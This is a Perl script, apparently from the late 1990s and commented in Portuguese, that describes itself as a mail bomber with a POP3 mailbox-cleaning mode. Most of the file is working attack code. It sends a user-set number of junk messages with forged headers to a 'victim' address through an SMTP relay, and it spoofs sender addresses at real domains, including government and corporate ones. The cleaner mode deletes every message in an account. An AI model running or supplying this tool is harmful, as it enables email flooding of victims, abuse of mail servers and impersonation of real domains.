#!/usr/bin/perl
###########################################################
#              maila.pl 0.1.5   by guybrush`              #
###########################################################
# Este script ? a cura e a doen?a ao mesmo tempo. ? um    #
# mail bomber que pode ser executado em um servidor em    #
# background. Mas ? tamb?m equipado com um limpador de    #
# caixa de correio, para neutralizar mailbombings de ou-  #
# tras pessoas.                                           #
###########################################################
# Requisitos:                                             #
# ------------------------------------------------------- #
# 1. Um computador  :)                                    #
# 2. Um servidor SMTP que permita enviar emails           #
# 3. Uma vida                                             #
###########################################################
# Uso:                                                    #
# ------------------------------------------------------- #
# ./maila.pl [-c -s servidor -u userid -p password]       #
#            [-m -s servidor -d email -n number]          #
# -c - Ativa o limpador de pop3                           #
#    -s - endere?o do servidor pop3                       #
#    -u - userid da conta                                 #
#    -p - senha da conta                                  #
# -m - Ativa o mail bomber                                #
#    -s - servidor de email que permita enviar emails     #
#    -d - endere?o de email da vitima                     #
#    -n - n?mero de mensagens que vai enviar              #
###########################################################
# Greets:                                                 #
# ------------------------------------------------------- #
# Thanks to #perl@ircnet, DeMa, raptor, me, myself and I  #
# Traduzido por: mauricio@vendomicro.com.br               #
###########################################################

use IO::Socket;
use Getopt::Std;
getopts("cms:u:p:d:n:");
if ($opt_c && $opt_m) { usage(); }
if (!$opt_c && !$opt_m) { usage(); }
if ($opt_c) { if (!($opt_s) || !($opt_u) || !($opt_p)) { usage(); } }
if ($opt_m) { if (!($opt_s) || !($opt_d) || !($opt_n)) { usage(); } }

if ($opt_c) {
$host = $opt_s;
$user = $opt_u;
$pass = $opt_p;
$remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$host",PeerPort=>"110") || die "Host n?o encontrado, parou em";
print "Limpando a conta $user\@$host ...\n";
$temp = <$remote>;
if ($temp =~ m/OK/) { print $remote ("user $user\r\n"); } else { die; }
$temp = <$remote>;
if ($temp =~ m/OK/) { print $remote ("pass $pass\r\n"); } else { die; }
$temp = <$remote>;
if ($temp =~ m/OK/) { print $remote ("list\r\n"); } else { die; }
$temp = <$remote>;
if ($temp =~ m/OK/) { 
 while (<$remote> !~ /^\./) {
  $temp = <$remote>;
  ($cn, $rudo) = split(/ /,$temp);
 }
 print "Apagando $cn mensagens...\n";
 for ($i = 1;$i <= $cn;$i++) {
  print $remote ("dele $i\r\n");
  if ($temp =~ m/OK/) { next; }
 }
} else { die; }
print "Feito!\n";
print $remote "quit\n";
$remote->flush();
close($remote);
}

if ($opt_m) {
$host = $opt_s;
$rcpt = $opt_d;
$numb = $opt_n;
print "Mailbombing $rcpt com $numb mensagens...\n";
for ($i = 1; $i <= $numb; $i++) {
 $remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$host",PeerPort=>"25") || die "Host nao encontrado, parou em";
 $temp = <$remote>;
 if ($temp =~ m/220/) { print $remote "helo hackers.com\n"; } else { next; }
 $temp = <$remote>;
 $mitt = &mittente;
 if ($temp =~ m/250/) { print $remote "mail from: $mitt\n"; } else { next; }
 $temp = <$remote>;
 if ($temp =~ m/250/) { print $remote "rcpt to: $rcpt\n"; } else { next; }
 $temp = <$remote>;
 if ($temp =~ m/250/) { print $remote "data\n"; } else { next; }
 $temp = <$remote>;
 $messaggio = &messaggio;
 if ($temp =~ m/354/) { print $remote "$messaggio\n"; } else { next; }
 $temp = <$remote>;
 if ($temp =~ m/250/) { print $remote "quit\n"; } else { next; }
 $remote->flush();
 close($remote);
 }
print "Feito!\n";
}

sub messaggio {
$a = "a,b,c,d,e,f,g,h,i,l,m,n,o,p,q,r,s,t,u,v,z,j,k,w,x,y,1,2,3,4,5,6,7,8,9,0,A,B,C,D,E,F,G,H,I,L,M,N,O,P,Q,R,S,T,U,V,Z,X,Y,J,K";
(@alfa) = split(/,/,$a);
$messa = "Received: by s0gamelo.it id AA11212 with SMTP; Sun, 12 Oct 97 13:40:58\nMessage-ID: <123.AA11345\@fanculo.com>\nTo: <$rcpt>\nDate: Sun, 12 Oct 97 11:30:27\nSubject: Try to save yourself\n\n@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)]\n@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)]\n@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)]\n@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)]\n@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)]\n\n.\n";
$messa
}

sub mittente {
$a = "a,b,c,d,e,f,g,h,i,l,m,n,o,p,q,r,s,t,u,v,z,j,k,w,x,y,1,2,3,4,5,6,7,8,9,0";
(@alfa) = split(/,/,$a);
$m = @alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)].@alfa[rand($#alfa)];
@domains = ("microsoft.com","libero.it","tiscalinet.it","katamail.it","tin.it","mail.com","hotmail.com","cia.gov","fbi.gov","nasa.gov","hackers.com","adultcheck.com","ciao.it","trovamore.com","abc.de","cybererotica.com","pmp.it","infinito.it","mp3.com","yahoo.com","ciaoweb.it","galactica.it","namezero.com","flashnet.it","ircd.it","funet.fi","stealth.net","webbernet.net","tvtb.it");
$dominio = @domains[rand($#domains)];
$mittente = "$m\@$dominio";
$mittente
}

sub usage {
print STDERR <<EOF;
Uso: $0 [-c -s server -u userid -p password] [-m -s server -d address -n number]

  -c - Ativa o limpador de pop3                            
     -s - endere?o do servidor pop3                        
     -u - userid da conta                                  
     -p - senha da conta                                   
  -m - Ativa o mail bomber                                 
     -s - servidor de email que permita enviar emails      
     -d - endere?o de email da vitima                      
     -n - n?mero de mensagens que vai enviar       

Examplos: $0 -c -s pop3.server.com -u foobar -p dunno
          $0 -m -s mail.server.cz -d foobar\@server.com -n 500
EOF
exit;
}
